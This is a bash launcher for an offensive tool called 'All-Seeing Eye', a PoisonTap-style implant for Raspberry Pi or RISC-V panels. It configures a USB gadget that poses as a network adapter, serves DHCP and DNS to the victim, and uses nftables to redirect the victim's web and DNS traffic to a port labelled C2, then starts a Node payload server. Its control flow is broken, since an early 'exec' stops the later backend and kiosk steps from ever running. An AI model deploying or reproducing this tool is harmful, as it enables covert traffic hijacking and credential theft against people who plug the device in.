#!/bin/bash
set -euo pipefail
# All-Seeing Eye | Optimized for RISC-V Smarthome Panels & RPi

# --- Configuration ---
# Set to "usb0" for PoisonTap (USB Gadget) or "wlan0" for WiFi/Antenna mode
IFACE="usb0"
GATEWAY="1.0.0.1"
DNS_PORT=5353
C2_PORT=1337

echo "[*] Initializing All-Seeing Eye on interface: $IFACE"

# USB Gadget Setup (Only if using usb0)
if [ "$IFACE" == "usb0" ]; then
    UDC_PATH="/sys/class/udc"
    CONFIG="/sys/kernel/config/usb_gadget/poison"

    if [ -d "$CONFIG" ]; then
        ls "$UDC_PATH" > "$CONFIG/UDC" 2>/dev/null || true
        rm -rf "$CONFIG"
    fi

    mkdir -p "$CONFIG"
    cd "$CONFIG"
    echo 0x1d6b > idVendor
    echo 0x0104 > idProduct
    mkdir -p strings/0x409
    echo "ASE_1780386676" > strings/0x409/serialnumber
    echo "All-Seeing Eye" > strings/0x409/manufacturer
    echo "RISC-V Control Panel" > strings/0x409/product

    mkdir -p functions/ecm.usb0
    mkdir -p configs/c.1/strings/0x409
    ln -s functions/ecm.usb0 configs/c.1/
    ls "$UDC_PATH" > UDC
fi

# Network Stack
ip link set "$IFACE" up
ip addr add "$GATEWAY"/8 dev "$IFACE" || true
sysctl -w net.ipv4.ip_forward=1

# nftables NAT
nft flush ruleset 2>/dev/null || true
nft add table inet poison
nft add chain inet poison prerouting '{ type nat hook prerouting priority -100; }'
nft add rule inet poison prerouting iifname "$IFACE" tcp dport 80 redirect to $C2_PORT
nft add rule inet poison prerouting iifname "$IFACE" tcp dport 443 redirect to $C2_PORT
nft add rule inet poison prerouting iifname "$IFACE" udp dport 53 redirect to $DNS_PORT

# dnsmasq
dnsmasq --interface="$IFACE"         --dhcp-range=1.0.0.2,1.0.0.250,12h         --dhcp-option=option:dns-server,$GATEWAY         --no-resolv         --server=8.8.8.8         &

# Launch Optimized Payload Server
# Note: Ensure Node.js is installed on the RISC-V system
exec node --no-warnings --max-old-space-size=128 ./pi_poisontap_2026.js

# Launch Control Panel Backend
node --no-warnings ./backend_server_2026.js &
echo "[+] Control Panel (All-Seeing Eye) active on port 3000"

# --- UI Launcher (Kiosk Mode) ---
# Check if a display is connected and launch the browser
if [ -n "$DISPLAY" ] || [ -n "$WAYLAND_DISPLAY" ]; then
    echo "[*] Launching All-Seeing Eye UI in Kiosk Mode..."
    # Support for common light browsers on RISC-V Linux
    if command -v chromium-browser &> /dev/null; then
        chromium-browser --kiosk --incognito --app=http://localhost:3000 &
    elif command -v firefox &> /dev/null; then
        firefox --kiosk http://localhost:3000 &
    else
        echo "[!] No supported browser found for kiosk mode. Please install chromium-browser or firefox."
    fi
fi
